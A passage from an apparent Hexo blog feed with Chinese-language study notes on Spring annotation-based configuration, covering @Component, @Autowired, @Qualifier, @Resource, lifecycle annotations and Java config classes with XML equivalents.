<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="comment">// SpringMVC只管理 com.tyt下的controller包下的类，两句效果相同</span></span><br><span class="line"><span class="comment">// @ComponentScan(&quot;com.tyt.controller&quot;)</span></span><br><span class="line"><span class="meta">@ComponentScan(value = &quot;com.tyt&quot;,</span></span><br><span class="line"><span class="meta">        includeFilters= @ComponentScan.Filter(type = FilterType.ANNOTATION,</span></span><br><span class="line"><span class="meta">        classes = Controller.class))</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SpringMvcConfig</span> &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<p><strong>运行效果：</strong><br><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815154748.png"><br><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815154748.png"></p>
<hr>
]]></content>
      <categories>
        <category>技术笔记</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>后端</tag>
        <tag>spring</tag>
      </tags>
  </entry>
  <entry>
    <title>Spring注解开发</title>
    <url>/posts/26f88c40.html</url>
    <content><![CDATA[<h1 id="一、-注解介绍"><a href="#一、-注解介绍" class="headerlink" title="一、 注解介绍"></a>一、 注解介绍</h1><p> Spring是轻代码而重配置的框架，配置比较繁重，影响开发效率，所以注解开发是一种趋势，注解代替xm配置文件可以简化配置，提高开发效率。<br> Spring注解方式减少了配置文件内容，更加便于管理，并且使用注解可以大大提高了开发效率！<br>注解本身是没有功能的，和xml一样，注解和xml都是一种元数据，元数据即解释数据的数据，也就是所谓的配置。</p>
<blockquote>
<ul>
<li><strong>xml用来管理bean；</strong></li>
<li><strong>注解只负责完成属性的注入；</strong></li>
</ul>
</blockquote>
<h1 id="二、Spring原始注解"><a href="#二、Spring原始注解" class="headerlink" title="二、Spring原始注解"></a>二、Spring原始注解</h1><h2 id="1-基于原始注解进行配置开发"><a href="#1-基于原始注解进行配置开发" class="headerlink" title="1. 基于原始注解进行配置开发"></a>1. 基于原始注解进行配置开发</h2><p>Spring原始注解主要是替代<code>&lt;Bean&gt;</code>的配置</p>
<table>
<thead>
<tr>
<th align="left">注解</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left">@Component</td>
<td align="left">使用在<code>类</code>上用于实例化Bean</td>
</tr>
<tr>
<td align="left">@Controller</td>
<td align="left">使用在<code>web层类</code>上实例化Bean</td>
</tr>
<tr>
<td align="left">@Service</td>
<td align="left">使用在<code>service层类</code>上用于实例化Bean</td>
</tr>
<tr>
<td align="left">@Repository</td>
<td align="left">使用在<code>dao层类</code>上用于实例化Bean</td>
</tr>
<tr>
<td align="left">@Value</td>
<td align="left">注入<code>普通属性</code></td>
</tr>
<tr>
<td align="left">@Scope</td>
<td align="left">标注Bean的<code>作用范围</code></td>
</tr>
<tr>
<td align="left">@Authowired</td>
<td align="left">使用在字段上用于根据<code>类型</code>依赖注入</td>
</tr>
<tr>
<td align="left">@Qualifier</td>
<td align="left">结合@Authowired一起用于使用用于根据<code>名称</code>进行依赖注入</td>
</tr>
<tr>
<td align="left">@Resource</td>
<td align="left">相当于@Authowired + @Qualifier，按照<code>名称</code>进行注入</td>
</tr>
<tr>
<td align="left">@PostConstruct</td>
<td align="left">使用在方法中标注该方法是Bean的<code>初始化</code>方法</td>
</tr>
<tr>
<td align="left">@PreDestroy</td>
<td align="left">使用在方法中标注该方法是Bean的<code>销毁</code>方法</td>
</tr>
</tbody></table>
<p><strong>从 Spring 2.5 开始就可以使用注解来配置依赖注入。而不是采用 XML 来描述一个 bean ，可以使用相关类，属性声明的注解，将 bean 配置移动到组件类本身，这样可以减少大量配置。当然我们需要完成两个前提条件，使用注解开发时，需要在Spring核心配置文件中配置<code>组件扫描</code>，作用是指定哪个包及其其子包下的Bean需要进行扫描以便识别使用注解配置的类、字段和方法</strong><br><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815155429.png"></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">	<span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">	<span class="attr">xmlns:context</span>=<span class="string">&quot;http://www.springframework.org/schema/context&quot;</span></span></span><br><span class="line"><span class="tag">	<span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="string"><span class="tag">	http://www.springframework.org/schema/beans/spring-beans.xsd</span></span></span><br><span class="line"><span class="string"><span class="tag">	http://www.springframework.org/schema/context</span></span></span><br><span class="line"><span class="string"><span class="tag">	http://www.springframework.org/schema/context/spring-context.xsd&quot;</span>&gt;</span></span><br><span class="line">	wesd</span><br><span class="line">	<span class="tag">&lt;<span class="name">context:annotation-config</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">context:component-scan</span> <span class="attr">base-package</span>=<span class="string">&quot;com.tyt&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="2-属性注入的Bean注解"><a href="#2-属性注入的Bean注解" class="headerlink" title="2. 属性注入的Bean注解"></a>2. 属性注入的Bean注解</h2><p>可使用注解<code>@Component</code>，<code>@Scope</code>，<code>@Value</code>处理属性的注入。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Component(&quot;bookDao&quot;)</span></span><br><span class="line"><span class="meta">@Scope(&quot;prototype&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BookDaoImpl</span> <span class="keyword">implements</span> <span class="title class_">BookDao</span> &#123;</span><br><span class="line">    <span class="meta">@Value(&quot;tyt&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="1-Component注解"><a href="#1-Component注解" class="headerlink" title="1. @Component注解"></a>1. @Component注解</h3><p><strong>相当于配置文件中的以下代码：</strong></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;bookDao&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.tyt.dao.impl.BookDaoImpl&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>

<hr>
<h3 id="2-Scope注解"><a href="#2-Scope注解" class="headerlink" title="2. @Scope注解"></a>2. @Scope注解</h3><p><strong>相当于配置文件中的以下代码：</strong></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;bookDao&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.tyt.dao.impl.BookDaoImpl&quot;</span> <span class="attr">scope</span>=<span class="string">&quot;prototype&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>

<hr>
<h3 id="3-Value注解"><a href="#3-Value注解" class="headerlink" title="3. @Value注解"></a>3. @Value注解</h3><p><strong>相当于配置文件中的以下代码：</strong></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> <span class="attr">value</span>=<span class="string">&quot;tyt&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="2-Component衍生注解"><a href="#2-Component衍生注解" class="headerlink" title="2. @Component衍生注解"></a>2. @Component衍生注解</h2><p><strong>@Component有三个衍生注解，它们的作用同Component时一样的，不同的命名只不过为了区分不同的层，为了更好的进行分层，Spring可以使用其它三个注解，目前使用哪一个功能都一样。</strong></p>
<blockquote>
<ul>
<li><code>@Controller</code>：Controller层，也就是控制层，接口请求的入口</li>
<li><code>@Service</code>：service层，业务逻辑层，具体的业务逻辑实现层</li>
<li><code>@Repository</code>：dao层，持久化层，和数据库交互的层</li>
</ul>
</blockquote>
<h2 id="3-自动装配的注解"><a href="#3-自动装配的注解" class="headerlink" title="3. 自动装配的注解"></a>3. 自动装配的注解</h2><p>在<a href="https://blog.csdn.net/qq_51938362/article/details/125762544?csdn_share_tail=%7B%22type%22:%22blog%22,%22rType%22:%22article%22,%22rId%22:%22125762544%22,%22source%22:%22qq_51938362%22%7D&ctrtid=4Wbhn">Spring 学习总结笔记【一、快速入门】</a>谈到过Spring是如何通过自动装备将依赖自动进行装配的，具体实现细节是<code>byName</code>和<code>byType</code>，这里的自动装配注解也是为自动装配服务的。<br>Spring将依赖自动进行装配，具体实现细节是byName和byType，这里的自动装配注解也是为自动装配服务的。</p>
<h3 id="1-Autowired-注解"><a href="#1-Autowired-注解" class="headerlink" title="1. @Autowired 注解"></a>1. @Autowired 注解</h3><p><strong>@Autowired是按类型byType自动转配的，不支持id也就是byName匹配：</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Service(&quot;bookService&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BookServiceImpl</span> <span class="keyword">implements</span> <span class="title class_">BookService</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 自动装配</span></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> BookDao bookDao;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>相当于配置文件中的以下代码：</strong></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;bookService&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.tyt.service.impl.BookServiceImpl&quot;</span> <span class="attr">autowire</span>=<span class="string">&quot;byType&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>

<hr>
<h3 id="2-Qualifier注解"><a href="#2-Qualifier注解" class="headerlink" title="2. @Qualifier注解"></a>2. @Qualifier注解</h3><p><strong><code>@Autowired</code>是根据类型自动装配的，加上<code>@Qualifier</code>则可以根据<code>byName</code>的方式自动装配，<code>@Qualifier不能单独使用</code>，必须结合<code>@Autowired</code>一起使用。</strong><br><strong>在使用@Qualifier之前，仅使用@Autowired，如果有两个类型一样的：</strong></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;bookDao&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.tyt.dao.impl.BookDaoImpl&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;bookDao222&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.tytdao.impl.BookDaoImpl&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>那么会报类型发现多个的错误：<code>NoUniqueBeanDefinitionException</code></strong><br><strong>配置上@Qualifier 注解后，也可以使用多个相同类型了，每次可以指定一个使用：</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Service(&quot;bookService&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BookServiceImpl</span> <span class="keyword">implements</span> <span class="title class_">BookService</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 自动装配</span></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="meta">@Qualifier(value=&quot;bookDao&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> BookDao bookDao;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>相当于配置文件中的以下代码：</strong></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;bookService&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.tyt.service.impl.BookServiceImpl&quot;</span> <span class="attr">autowire</span>=<span class="string">&quot;byType&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;bookDao&quot;</span> <span class="attr">ref</span>=<span class="string">&quot;bookDao&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>
<hr>
<h3 id="3-Resource-注解"><a href="#3-Resource-注解" class="headerlink" title="3. @Resource 注解"></a>3. @Resource 注解</h3><p><strong>@Resource 相当于 @Qualifier + @Autowired</strong></p>
<blockquote>
<p><code>@Resource</code></p>
<ul>
<li>如指定了<code>name</code>属性，则先按该属性进行byName方式进行装配；</li>
<li>如果没有指定<code>name</code>属性 ①如果注解写在<code>字段</code>上，默认取<code>字段名</code>进行装配 ②如果注解写在<code>setter方法</code>上，默认取<code>属性名</code>进行装配</li>
<li>如果以上都不成功，则按byType的方式自动装配</li>
<li>都不成功，则报异常。</li>
</ul>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Service(&quot;bookService&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BookServiceImpl</span> <span class="keyword">implements</span> <span class="title class_">BookService</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Resource(&quot;bookDao&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> BookDao bookDao;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="4-三者区别"><a href="#4-三者区别" class="headerlink" title="4. 三者区别"></a>4. 三者区别</h3><blockquote>
<ul>
<li><strong><code>@Autowired</code>默认按类型装配，默认情况下必须要求依赖对象存在，如果要允许null值，可以设置它的<code>required</code>属性为<code>false</code>。如果想使用名称装配可以结合@Qualifier注解进行使用</strong></li>
<li><strong><code>@Qualifier</code> 接口可以有多个实现类,可以按实现类的类名进行注入</strong></li>
<li><strong><code>@Resource</code> 接口可以有多个实现类，先通过byName方式进行匹配，若匹配失败再通过byType方式注入</strong></li>
</ul>
</blockquote>
<h2 id="4-生命周期注解"><a href="#4-生命周期注解" class="headerlink" title="4. 生命周期注解"></a>4. 生命周期注解</h2><blockquote>
<ul>
<li><code>@PostConstruct</code>：标注该方法是Bean的初始化方法</li>
<li><code>@PreDestroy</code>：标注该方法是Bean的销毁方法</li>
</ul>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Repository(&quot;bookDao&quot;)</span></span><br><span class="line"><span class="meta">@Scope(&quot;prototype&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BookDaoImpl</span> <span class="keyword">implements</span> <span class="title class_">BookDao</span> &#123;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@Value(&quot;tyt&quot;)</span></span><br><span class="line">	<span class="keyword">private</span> String name;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// 初始化方法</span></span><br><span class="line">	<span class="meta">@PostConstruct</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">()</span>&#123;</span><br><span class="line">		System.out.println(<span class="string">&quot;init----&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// 销毁方法</span></span><br><span class="line">	<span class="meta">@PreDestroy</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span>&#123;</span><br><span class="line">		System.out.println(<span class="string">&quot;destroy----&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>相当于配置文件中的以下代码：</strong></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;bookDao&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.tyt.Dao.impl.BookDaoImpl&quot;</span> <span class="attr">init-method</span>=<span class="string">&quot;init&quot;</span> <span class="attr">destroy-method</span>=<span class="string">&quot;destroy&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> <span class="attr">ref</span>=<span class="string">&quot;tyt&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h1 id="三、Spring新注解"><a href="#三、Spring新注解" class="headerlink" title="三、Spring新注解"></a>三、Spring新注解</h1><p><strong>使用上诉原始注解还不能够完全替代xml配置文件，还需要使用注解替代的配置如下：</strong></p>
<blockquote>
<ul>
<li><strong>非自定义的Bean的配置：<code>&lt;bean&gt;</code></strong></li>
<li><strong>加载properties文件的配置：<code>&lt;context:property-placeholder&gt;</code></strong></li>
<li><strong>组件扫描的配置：<code>&lt;context:component-scan&gt;</code></strong></li>
<li><strong>引入其他文件：<code>&lt;import&gt;</code></strong></li>
</ul>
</blockquote>
<p><strong>Spring新注解如下：</strong></p>
<table>
<thead>
<tr>
<th align="left">注解</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left">@Configuration</td>
<td align="left">用于指定当前类是一个Spring<code>配置类</code>，当创建容器时会从该类上加载注解</td>
</tr>
<tr>
<td align="left">@ComponentScan</td>
<td align="left">用于指定Spring在初始化容器时要<code>扫描</code>的包。作用同在Spring核心配置文件中的<code>&lt;context:component-scan base-package=&quot;com.tyt&quot;/&gt;</code>相同</td>
</tr>
<tr>
<td align="left">@Import</td>
<td align="left">用于导入其他<code>配置类</code></td>
</tr>
<tr>
<td align="left">@Bean</td>
<td align="left">使用在<code>方法</code>上，标注将该方法的返回值存储到Spring容器中</td>
</tr>
<tr>
<td align="left">@PropertySource</td>
<td align="left">用于加载<code>.properties</code>文件中的配置信息</td>
</tr>
</tbody></table>
<p><strong>新注解的出现又为Spring的开发方式（基于xml配置方式，注解开发）增加了一项基于Java类进行配置开发，不需要任何xml配置文件，事实上，Config类代替了xml配置文件。</strong></p>
<h2 id="1-Configuration注解"><a href="#1-Configuration注解" class="headerlink" title="1. @Configuration注解"></a>1. @Configuration注解</h2><blockquote>
<p><strong>标志当前类是Spring<code>的核心配置类</code></strong></p>
</blockquote>
<h2 id="2-ComponentScan注解"><a href="#2-ComponentScan注解" class="headerlink" title="2. @ComponentScan注解"></a>2. @ComponentScan注解</h2><blockquote>
<p><strong>指定Spring在初始化容器时要<code>扫描</code>的包</strong></p>
</blockquote>
<h2 id="3-Import注解"><a href="#3-Import注解" class="headerlink" title="3. @Import注解"></a>3. @Import注解</h2><blockquote>
<p><strong>用于导入其他<code>配置类</code></strong> </p>
</blockquote>
<h2 id="4-Bean注解"><a href="#4-Bean注解" class="headerlink" title="4. @Bean注解"></a>4. @Bean注解</h2><blockquote>
<p><strong>使用在<code>方法</code>上，标注将该方法的返回值存储到Spring容器中</strong></p>
</blockquote>
<h2 id="5-PropertySource注解"><a href="#5-PropertySource注解" class="headerlink" title="5. @PropertySource注解"></a>5. @PropertySource注解</h2><blockquote>
<p>用于加载<code>.properties</code>文件中的配置信息 </p>
</blockquote>
<h2 id="6-JavaConfig类编写"><a href="#6-JavaConfig类编写" class="headerlink" title="6. JavaConfig类编写"></a>6. JavaConfig类编写</h2><p><strong>① 首先定义一个 Jdbc.properties</strong></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">jdbc.driver=com.mysql.jdbc.Driver</span><br><span class="line">jdbc.url=jdbc:mysql://localhost:3306/test?characterEncoding=utf8</span><br><span class="line">jdbc.username=root</span><br><span class="line">jdbc.password=****</span><br></pre></td></tr></table></figure>
<p><strong>② 定义一个JdbcConfig类</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@PropertySource(&quot;jdbc.properties&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JdbcConfig</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;jdbc.driver&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String driver;</span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;jdbc.url&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String url;</span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;jdbc.name&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;jdbc.password&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String password;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 定义一个方法获得要管理的对象</span></span><br><span class="line">    <span class="comment">// 添加 Bean, 表示当前方法返回值为一个 Bean</span></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> DataSource <span class="title function_">dataSource</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">DruidDataSource</span> <span class="variable">ds</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DruidDataSource</span>();</span><br><span class="line">        ds.setDriverClassName(driver);</span><br><span class="line">        ds.setUrl(url);</span><br><span class="line">        ds.setUsername(name);</span><br><span class="line">        ds.setPassword(password);</span><br><span class="line">        <span class="keyword">return</span> ds;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>相当于配置文件（命名为JdbcConfig.xml）中的以下代码：</strong></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:context</span>=<span class="string">&quot;http://www.springframework.org/schema/context&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;</span></span></span><br><span class="line"><span class="string"><span class="tag">            http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="string"><span class="tag">            http://www.springframework.org/schema/beans/spring-beans.xsd</span></span></span><br><span class="line"><span class="string"><span class="tag">            http://www.springframework.org/schema/context</span></span></span><br><span class="line"><span class="string"><span class="tag">            http://www.springframework.org/schema/context/spring-context.xsd&quot;</span>&gt;</span></span><br><span class="line">            </span><br><span class="line">    <span class="comment">&lt;!-- 1、开启context命名空间，需要添加上述和context有关的信息 --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 2、使用context加载配置文件 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">context:property-placeholder</span> <span class="attr">location</span>=<span class="string">&quot;classpath:jdbc.properties&quot;</span>/&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 3、使用$&#123;&#125;动态获取值 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;druidDataSource&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.alibaba.druid.pool.DruidDataSource&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;driverClassName&quot;</span> <span class="attr">value</span>=<span class="string">&quot;$&#123;jdbc.driver&#125;&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;url&quot;</span> <span class="attr">value</span>=<span class="string">&quot;$&#123;jdbc.url&#125;&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">value</span>=<span class="string">&quot;$&#123;jdbc.username&#125;&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">value</span>=<span class="string">&quot;$&#123;jdbc.password&#125;&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>③ 定义SpringConfig类</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@ComponentScan(&#123;&quot;com.tyt.dao&quot;, &quot;com.tyt.service&quot;&#125;)</span></span><br><span class="line"><span class="meta">@Import(&#123;JdbcConfig.class&#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SpringConfig</span> &#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    *  第三方 bean 管理， 如 数据库连接池，也可将其写入其他配置类，使用@Import加载即可</span></span><br><span class="line"><span class="comment">    * */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>相当于配置文件（命名为SpringConfig.xml）中的以下代码：</strong></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:context</span>=<span class="string">&quot;http://www.springframework.org/schema/context&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="string"><span class="tag">       http://www.springframework.org/schema/beans/spring-beans.xsd</span></span></span><br><span class="line"><span class="string"><span class="tag">        http://www.springframework.org/schema/context</span></span></span><br><span class="line"><span class="string"><span class="tag">        http://www.springframework.org/schema/context/spring-context.xsd&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">context:annotation-config</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">context:component-scan</span> <span class="attr">base-package</span>=<span class="string">&quot;com.tyt.dao&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">context:component-scan</span> <span class="attr">base-package</span>=<span class="string">&quot;com.tyt.service&quot;</span>/&gt;</span></span><br><span class="line">    </span><br><span class="line">	<span class="tag">&lt;<span class="name">import</span> <span class="attr">resource</span>=<span class="string">&quot;JdbcConfig.xml&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>


<p><strong>④ 使用Spring的API获取Bean的实例</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">	<span class="type">ApplicationContext</span> <span class="variable">app</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AnnotationConfigApplicationContext</span>(SpringConfig.class);</span><br><span class="line">	<span class="type">BookDao</span> <span class="variable">bookDao</span> <span class="operator">=</span> app.getBean(<span class="string">&quot;bookDao&quot;</span>, BookDao.class);</span><br><span class="line">	bookDao.save();</span><br><span class="line">	</span><br><span class="line">	<span class="type">BookService</span> <span class="variable">bookService</span> <span class="operator">=</span> app.getBean(<span class="string">&quot;bookService&quot;</span>, BookService.class);</span><br><span class="line">	bookService.save();</span><br><span class="line">	</span><br><span class="line">	<span class="type">DataSource</span> <span class="variable">dataSource</span> <span class="operator">=</span> app.getBean(DataSource.class);</span><br><span class="line">	System.out.println(dataSource);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>总结</strong><br>到这篇为止，终于全面了解了基于元数据的IOC注入模式：XML配置、注解模式、Java配置类，这几种都可以混合使用，在合适的场景使用合适的元数据注入模式，XML比较清晰，注解模式比较快捷，Java配置类模式完全不依赖配置文件，只能说各有特色。</p>
]]></content>
      <categories>
        <category>技术笔记</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>后端</tag>
        <tag>spring</tag>
      </tags>
  </entry>
  <entry>
    <title>Spring控制反转-IOC</title>
    <url>/posts/a5005a49.html</url>
